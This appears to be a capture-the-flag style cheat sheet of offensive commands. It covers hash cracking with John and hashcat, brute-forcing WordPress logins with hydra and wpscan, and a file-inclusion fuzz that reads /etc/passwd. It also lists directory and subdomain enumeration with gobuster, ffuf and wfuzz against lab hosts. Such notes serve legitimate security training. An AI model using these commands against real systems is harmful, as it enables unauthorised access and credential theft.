John — Basic Command

    john — wordlist=password.lst hashfile

John — Crack Zip File

    zip2john file.zip > zip.txt
    john — format=zip zip.txt

John — Crack RAR File

    rar2john file.rar > rar.txt
    john — format=zip rar.txt

John — Crack Oracle

    john — format=oracle11 orahash.txt

John — Crack NTLMv2

    john — format=netntlmv2 hash.txt

Hashcat — Crack NTLMv2

    hashcat64.exe -m 5600 hash.txt password_list.txt -o cracked.txt (Windows)
    or
    hashcat -m 5600 -a 3 hash.txt (Kali Linux)

Hashcat — Crack AIX Password

    hashcat-cli64.exe -a 0 -m 6300 hash.txt rockyou.txt (smd5)
    hashcat-cli64.exe -a 0 -m 101 hash.txt rockyou.txt (sha1)

Hashcat — Crack SHA512 (Shadow file) — Start with $6$

    hashcat64.exe -a 0 -m 1800 hash.txt rockyou.txt

'''''''''''''''''''''''''''''''''''''''''''''''''''''http logon/post attack'''''''''''''''''''''''''''''''''''
hydra -L fsocity.dic -P fsocity.dic 10.10.68.70 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

===================================hashcrack===============================================================
john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt --pot=output.txt

hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 1800 hash.txt rockyou.txt

hashcat --force -m 1600 -a 0 hash /home/kali/rockyou.txt 

-a	attack mode (0 = dictionary attack)
-m	mode to assign the hash algorithm (1800 = SHA512 UNIX)
hash.txt	file which contains the hash to crank
rockyou.txt	password wordlist
---------------------------------------------------------------------------------------------------
when ssh private key encrypted with passphrase: use ssh2john and john to crack the hash. I saved the private key as id_rsa.

🚀 /usr/share/john/ssh2john.py id_rsa > id_rsa_hash

🚀 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash

then we will get the passphrase as the outcome

---------------------------------------------wpscan brute------------------------------------------------------

wpscan --url http://dc-2/ --passwords passwords.txt
wpscan --url http://jack.thm/ -t 3 -P rockyou.txt -U users.txt
wpscan --url http://derpnstink.local/weblog/ --passwords /usr/share/wordlists/fasttrack.txt --usernames admin -t 25

wpscan --url http://derpnstink.local/weblog/ --enumerate u,p


-----------------------------------------------------------cewl---------------------------------------------

Cewl is a tool which spiders a given URL and returns a list of words which can then be used for password cracking.
cewl http://dc-2/ > passwords.txt

----------------------------------------------------ffuf-------------------------------------------------------------
ffuf -u ‘http://192.168.120.34/secret/evil.php?FUZZ=/etc/passwd’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0

ffuf -u http://10.10.167.133/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion


----------------------------------------------------------directory_bruting------------------------------------------------

gobuster dir -u http://192.168.120.34  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k

gobuster dir -u http://olympus.thm/~webmaster  -w /usr/share/seclists/Discovery/Web-Content/common.txt
--------------------------------------------------Subdomain_bruteforce---------------------------------------------------------------

gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://thetoppers.htb --append-domain Host: [word].thetoppers.htb
---------------------------------------------------------------------------------------------------------------------------------------------

ffuf -w subdomains.txt -u http://website.com/ -H “Host: FUZZ.website.com”
ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 3913 :filter false positive
wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://thetoppers.htb' -H "Host: FUZZ.thetoppers.htb" --hw 290
sudo wfuzz -u https://10.10.11.102 -H "Host: FUZZ.windcorp.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 315
